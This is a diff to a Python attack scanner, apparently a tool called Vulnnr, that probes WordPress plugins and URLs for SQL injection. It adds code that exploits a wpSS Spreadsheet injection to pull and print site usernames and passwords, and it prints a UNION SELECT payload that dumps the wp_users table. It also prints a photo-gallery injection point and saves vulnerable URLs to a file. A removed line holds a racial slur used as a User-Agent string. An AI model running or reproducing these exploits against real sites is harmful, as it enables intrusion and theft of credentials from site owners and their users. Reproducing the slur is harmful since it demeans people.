@@ -28,10 +28,10 @@ now = datetime.datetime.now()
 year = now.strftime('%Y')
 month = now.strftime('%m')
 site = "www.fedsearch.xyz"
-Version = "1.2.1"
+Version = "1.2.2"
 timeout = 5
 HEADERS = {
-    'User-Agent': 'NiggerPenis-WIN!10',
+    'User-Agent': 'Vulnnr-WIN!10',
     'Content-type' : '*/*',
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
     'Accept-Language': 'en-US,en;q=0.5',
@@ -329,8 +329,11 @@ def com_portfolio(url):
 
 def Spreedsheet(url):
     test = requests.get(url+"/wp-content/plugins/wpSS/ss_load.php", timeout=timeout)
-    if test.status_code == 200:
-        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found SQL Injection | {GREEN}{url}?ss_id=1+and+(1=0)+union+select+1,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4+from+wp_users--&display=plain")
+    if "WordPress Spreadsheet" in test.text:
+        User_Pass = re.findall('<title>(.*)</title>', test.content)
+        username = User_Pass[1].split(':')[0]
+        password = User_Pass[1].split(':')[1]
+        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found SQL Injection | wp-username: {str(username)} wp-password: {str(password)}{GREEN}{url}?ss_id=1+and+(1=0)+union+select+1,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4+from+wp_users--&display=plain")
     else:  
         print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}wpSS SQL {PURPLE}=> {RED}Not Vuln")
 
@@ -462,7 +465,9 @@ def Localize(url):
 def photog(url):
     test = requests.get(url+"/wp-content/plugins/photo-gallery")
     if test.status_code == 200:
-        print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found SQL Injection | {GREEN}{url}/wp-admin/admin-ajax.php?action=albumsgalleries_bwg&album_id=<SQLi+HERE>&width=785&height=550&bwg_nonce=9e367490cc")
+        if "albumsgalleries" in test.text:
+            
+            print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}Found SQL Injection | {GREEN}{url}/wp-admin/admin-ajax.php?action=albumsgalleries_bwg&album_id=<SQLi+HERE>&width=785&height=550&bwg_nonce=9e367490cc")
     else:  
         print(f" {PURPLE}[ {GREEN}! {PURPLE}] {RESET}photo-gallery SQL {PURPLE}=>{RESET} {RED}Not Vuln")
 
@@ -891,6 +896,8 @@ def parms(site):
                         #f.write(test.text)
                     f.close()
         return print(f" {PURPLE}[ {GREEN}? {PURPLE}] {RESET}PramSpider {PURPLE}=> {GREEN}collected results and saved to {filename}")
+    else:
+        print(f" {PURPLE}[ {GREEN}? {PURPLE}] {RESET}PramSpider {PURPLE}=> {RED}None Found")
         
                 
 
@@ -944,7 +951,7 @@ def CheckSqli(MaybeSqli, site):
              'io_error', 'privilege_not_granted', 'getimagesize', 'preg_match', 'mysqli_result', 'mysqli', 'MySQL']
             for s in oop:
                 Checksqli = requests.get(url + "'", timeout=5, headers=HEADERS)
-                if "error" in Checksqli.text:
+                if "SQL" in Checksqli.text:
                     SQLI = url.replace("'", '')
                     print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}SQL Injection {PURPLE}=> {GREEN}Vuln{RESET} | {GREEN}{SQLI}")
                     filename = "Results/SQLInjection.txt"
@@ -963,7 +970,12 @@ def CheckSqli(MaybeSqli, site):
                     filename = "Results/SQLInjection.txt"
                     with open(filename, "a+") as f:
                         f.write(SQLI + '\n')
-                    
+                if "error in" in Checksqli.text:
+                    SQLI = url.replace("'", '')
+                    print(f" {PURPLE}[ {GREEN}$ {PURPLE}] {RESET}SQL Injection {PURPLE}=> {GREEN}Vuln{RESET} | {GREEN}{SQLI}")
+                    filename = "Results/SQLInjection.txt"
+                    with open(filename, "a+") as f:
+                        f.write(SQLI + '\n')
                     
                 
 
